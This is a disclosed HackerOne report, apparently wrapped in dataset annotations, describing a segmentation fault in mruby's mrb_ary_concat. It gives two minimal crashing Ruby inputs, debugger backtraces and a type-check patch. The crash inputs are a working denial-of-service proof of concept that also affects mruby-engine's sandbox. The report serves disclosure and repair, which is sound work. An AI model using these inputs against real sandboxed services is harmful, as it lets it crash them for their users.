{
  "reported_to": "shopify-scripts",
  "reported_by": "haquaman ",
  "title": "Denial of service due to invalid memory access in mrb_ary_concat",
  "content": "\nHi,\nThe following file causes a segmentation fault in mruby, which also causes a segmentation fault in mruby-engine. I've minimized this file down to the bare bones what crashes it, then renamed variables and tidied so you can see what is needed and what isn't.\nCode 54 Bytes\n1case \"\"\n2  when 0\n3end\n4x *case\n5  when true\n6    * = 0\n7end\nAlso this file causes the same issue:\nCode 53 Bytes\n1case \"\"\n2  when 0\n3end\n4x = *case\n5  when 0\n6    * = 0\n7end\nDifference between the two is one is a method call, and one is assignment.\nCode 52 Bytes\n1$ ./dev/bin/mruby --version\n2mruby 1.2.0 (2015-11-17)\nCode 102 Bytes\n1$ ./dev/bin/mruby crash-1.rb\n2crash-1.rb:4:3: '*' interpreted as argument prefix\n3Segmentation fault: 11\nCode 2.39 KiB\n1$ lldb ./dev/bin/mruby crash-1.rb\n2(lldb) target create \"./dev/bin/mruby\"\n3Current executable set to './dev/bin/mruby' (x86_64).\n4(lldb) settings set -- target.run-args  \"crash-1.rb\"\n5(lldb) r\n6Process 54552 launched: './dev/bin/mruby' (x86_64)\n7crash-1.rb:4:3: '*' interpreted as argument prefix\n8Process 54552 stopped\n9* thread #1: tid = 0x652cabc, 0x0000000100001837 mruby`ary_modify + 55, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x4800000019)\n10    frame #0: 0x0000000100001837 mruby`ary_modify + 55\n11mruby`ary_modify:\n12->  0x100001837 <+55>: cmpl   $0x1, (%rax)\n13    0x10000183a <+58>: jne    0x100001889               ; <+137>\n14    0x100001840 <+64>: movq   -0x10(%rbp), %rax\n15    0x100001844 <+68>: movq   0x28(%rax), %rax\n16(lldb) bt\n17* thread #1: tid = 0x652cabc, 0x0000000100001837 mruby`ary_modify + 55, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x4800000019)\n18  * frame #0: 0x0000000100001837 mruby`ary_modify + 55\n19    frame #1: 0x0000000100001ca1 mruby`ary_concat + 49\n20    frame #2: 0x0000000100001c66 mruby`mrb_ary_concat + 70\n21    frame #3: 0x000000010004263f mruby`mrb_vm_exec + 25439\n22    frame #4: 0x000000010003c2c7 mruby`mrb_vm_run + 135\n23    frame #5: 0x00000001000446b4 mruby`mrb_top_run + 100\n24    frame #6: 0x000000010006f19f mruby`load_exec + 1183\n25    frame #7: 0x000000010006ece3 mruby`mrb_load_file_cxt + 67\n26    frame #8: 0x0000000100000d78 mruby`main + 904\n27    frame #9: 0x00007fff8a9db5ad libdyld.dylib`start + 1\n28    frame #10: 0x00007fff8a9db5ad libdyld.dylib`start + 1\n29(lldb) register read\n30General Purpose Registers:\n31       rax = 0x0000004800000019\n32       rbx = 0x0000000000000000\n33       rcx = 0x0000000000200086\n34       rdx = 0x0000000100000000  mruby`_mh_execute_header\n35       rdi = 0x00000001002029f0\n36       rsi = 0x0000000100000000  mruby`_mh_execute_header\n37       rbp = 0x00007fff5fbfc9d0\n38       rsp = 0x00007fff5fbfc9a0\n39        r8 = 0x0000000000000001\n40        r9 = 0x0000000000000000\n41       r10 = 0x0000000000000001\n42       r11 = 0x0000000100200000\n43       r12 = 0x0000000000000000\n44       r13 = 0x0000000000000000\n45       r14 = 0x0000000000000000\n46       r15 = 0x0000000000000000\n47       rip = 0x0000000100001837  mruby`ary_modify + 55\n48    rflags = 0x0000000000010206\n49        cs = 0x000000000000002b\n50        fs = 0x0000000000000000\n51        gs = 0x0000000000000000\n52\n53(lldb) q\n54Quitting LLDB will kill one or more processes. Do you really want to proceed: [Y/n] y\n55\nand the second file:\nCode 51 Bytes\n1$ ./dev/bin/mruby crash-2.rb\n2Segmentation fault: 11\nCode 2.34 KiB\n1$ lldb ./dev/bin/mruby crash-2.rb\n2(lldb) target create \"./dev/bin/mruby\"\n3Current executable set to './dev/bin/mruby' (x86_64).\n4(lldb) settings set -- target.run-args  \"crash-2.rb\"\n5(lldb) r\n6Process 66755 launched: './dev/bin/mruby' (x86_64)\n7Process 66755 stopped\n8* thread #1: tid = 0x652fc10, 0x0000000100001837 mruby`ary_modify + 55, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x4800000019)\n9    frame #0: 0x0000000100001837 mruby`ary_modify + 55\n10mruby`ary_modify:\n11->  0x100001837 <+55>: cmpl   $0x1, (%rax)\n12    0x10000183a <+58>: jne    0x100001889               ; <+137>\n13    0x100001840 <+64>: movq   -0x10(%rbp), %rax\n14    0x100001844 <+68>: movq   0x28(%rax), %rax\n15(lldb) bt\n16* thread #1: tid = 0x652fc10, 0x0000000100001837 mruby`ary_modify + 55, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x4800000019)\n17  * frame #0: 0x0000000100001837 mruby`ary_modify + 55\n18    frame #1: 0x0000000100001ca1 mruby`ary_concat + 49\n19    frame #2: 0x0000000100001c66 mruby`mrb_ary_concat + 70\n20    frame #3: 0x000000010004263f mruby`mrb_vm_exec + 25439\n21    frame #4: 0x000000010003c2c7 mruby`mrb_vm_run + 135\n22    frame #5: 0x00000001000446b4 mruby`mrb_top_run + 100\n23    frame #6: 0x000000010006f19f mruby`load_exec + 1183\n24    frame #7: 0x000000010006ece3 mruby`mrb_load_file_cxt + 67\n25    frame #8: 0x0000000100000d78 mruby`main + 904\n26    frame #9: 0x00007fff8a9db5ad libdyld.dylib`start + 1\n27    frame #10: 0x00007fff8a9db5ad libdyld.dylib`start + 1\n28(lldb) register read\n29General Purpose Registers:\n30       rax = 0x0000004800000019\n31       rbx = 0x0000000000000000\n32       rcx = 0x0000000000200086\n33       rdx = 0x0000000100000000  mruby`_mh_execute_header\n34       rdi = 0x00000001002029f0\n35       rsi = 0x0000000100000000  mruby`_mh_execute_header\n36       rbp = 0x00007fff5fbfc9d0\n37       rsp = 0x00007fff5fbfc9a0\n38        r8 = 0x0000000000000001\n39        r9 = 0x0000000000000000\n40       r10 = 0x0000000000000001\n41       r11 = 0x0000000100700000\n42       r12 = 0x0000000000000000\n43       r13 = 0x0000000000000000\n44       r14 = 0x0000000000000000\n45       r15 = 0x0000000000000000\n46       rip = 0x0000000100001837  mruby`ary_modify + 55\n47    rflags = 0x0000000000010206\n48        cs = 0x000000000000002b\n49        fs = 0x0000000000000000\n50        gs = 0x0000000000000000\n51\n52(lldb) q\n53Quitting LLDB will kill one or more processes. Do you really want to proceed: [Y/n] y\n54\nI took a look at the cause in the codegeneration, ... and gave up. But in the src/array.c I could fix these two issues with one patch, as follows:\nCode 690 Bytes\n1diff --git a/src/array.c b/src/array.c\n2index 5a319d8..4814968 100644\n3--- a/src/array.c\n4+++ b/src/array.c\n5@@ -259,6 +259,15 @@ ary_concat(mrb_state *mrb, struct RArray *a, mrb_value *ptr, mrb_int blen)\n6 MRB_API void\n7 mrb_ary_concat(mrb_state *mrb, mrb_value self, mrb_value other)\n8 {\n9+  if (!mrb_array_p(self)) {\n10+    mrb_raisef(mrb, E_TYPE_ERROR, \"expecting Array, got %S\", mrb_obj_value(mrb_obj_class(mrb, self)));\n11+    return;\n12+  }\n13+  if (!mrb_array_p(other)) {\n14+    mrb_raisef(mrb, E_TYPE_ERROR, \"expecting Array, got %S\", mrb_obj_value(mrb_obj_class(mrb, other)));\n15+    return;\n16+  }\n17+\n18   struct RArray *a2 = mrb_ary_ptr(other);\n19 \n20   ary_concat(mrb, mrb_ary_ptr(self), a2->ptr, a2->len);\nAs mentioned above, both these files affect mruby-engine as well:\nCode 2.39 KiB\n1./bin/sandbox:20: [BUG] Segmentation fault at 0x00000000000019\n2ruby 2.3.0p0 (2015-12-25 revision 53290) [x86_64-darwin15]\n3\n4-- Crash Report log information --------------------------------------------\n5   See Crash Report log file under the one of following:\n6     * ~/Library/Logs/CrashReporter\n7     * /Library/Logs/CrashReporter\n8     * ~/Library/Logs/DiagnosticReports\n9     * /Library/Logs/DiagnosticReports\n10   for more details.\n11Don't forget to include the above Crash Report log file in bug reports.\n12\n13-- Control frame information -----------------------------------------------\n14c:0003 p:---- s:0010 e:000009 CFUNC  :sandbox_eval\n15c:0002 p:0201 s:0005 E:0006b8 EVAL   ./bin/sandbox:20 [FINISH]\n16c:0001 p:0000 s:0002 E:002310 (none) [FINISH]\n17\n18-- Ruby level backtrace information ----------------------------------------\n19./bin/sandbox:20:in `<main>'\n20./bin/sandbox:20:in `sandbox_eval'\n21\n22-- Machine register context ------------------------------------------------\n23 rax: 0x000000011061c3f0 rbx: 0x0000000110674668 rcx: 0x0000000000000004\n24 rdx: 0x000000011061c3f0 rdi: 0x0000000110614440 rsi: 0x0000000000000001\n25 rbp: 0x00007fff50037f40 rsp: 0x00007fff50037f10  r8: 0x0000000000000003\n26  r9: 0x0000000000000000 r10: 0x0000000000000000 r11: 0x00000001106145a8\n27 r12: 0x00000001106145a8 r13: 0x000000011063b2f0 r14: 0x0000000000000001\n28 r15: 0x0000000000000001 rip: 0x00000001104f233d rfl: 0x0000000000010246\n29\n30-- C level backtrace information -------------------------------------------\n310   ruby                                0x000000010fd645d4 rb_vm_bugreport + 388\n321   ruby                                0x000000010fc06023 rb_bug_context + 483\n332   ruby                                0x000000010fcd9653 sigsegv + 83\n343   libsystem_platform.dylib            0x00007fff9826d52a _sigtramp + 26\n354   mruby_engine.bundle                 0x00000001104f233d mrb_ary_concat + 29\n365   ???                                 0x0000000110614440 0x0 + 4569777216\n37\n38-- Other runtime information -----------------------------------------------\n39\n40* Loaded script: ./bin/sandbox\n41\n42* Loaded features:\n43\n44    0 enumerator.so\n45    1 thread.rb\n46    2 rational.so\n47    3 complex.so\n48<snip various gems>\n49  185 /Users/<snip>/mruby-engine/lib/mruby_engine/mruby_engine.bundle\n50  186 /Users/<snip>/mruby-engine/lib/mruby_engine.rb\n51\n52[NOTE]\n53You may have encountered a bug in the Ruby interpreter or extension libraries.\n54Bug reports are welcome.\n55For details: http://www.ruby-lang.org/bugreport.html\n56\nThe second file produced same backtrace, but different register values.\nAfter applying that patch to ext/mruby_engine/mruby and recompiling, these two files no longer crash.\nIf you end up finding a better patch elsewhere for the root cause, can you let me know what you end up applying so I can change what I fuzz against?\nCheers,\nHugh\n\n",
  "severity": [
    7.0,
    8.9
  ],
  "bounty": 8000,
  "weaknesses": [
    "Uncontrolled Resource Consumption"
  ],
  "screenshots": {},
  "disclosed_date": 1482023220,
  "report_url": "https://hackerone.com/reports/184712",
  "is_multi_component": false,
  "complexity": "MEDIUM",
  "novelty": "LOW",
  "vuln_category": "CODE",
  "steps": [
    [
      1,
      "Create a Ruby file with the following content:\ncase \"\"\n  when 0\nend\nx *case\n  when true\n    * = 0\nend"
    ],
    [
      2,
      "Run the file with mruby: ./dev/bin/mruby crash-1.rb"
    ]
  ],
  "vuln_description": "The vulnerability is a denial of service due to invalid memory access in mrb_ary_concat in mruby. It occurs when processing specific malformed Ruby code involving case statements and splat operators, leading to a segmentation fault.",
  "reason": "The vulnerability involves a specific combination of Ruby syntax elements (case statements and splat operators) that trigger an invalid memory access. While the triggering code is relatively simple, understanding why it causes a crash requires knowledge of mruby's array concatenation implementation and memory management.",
  "new_complexity": "MEDIUM",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null
}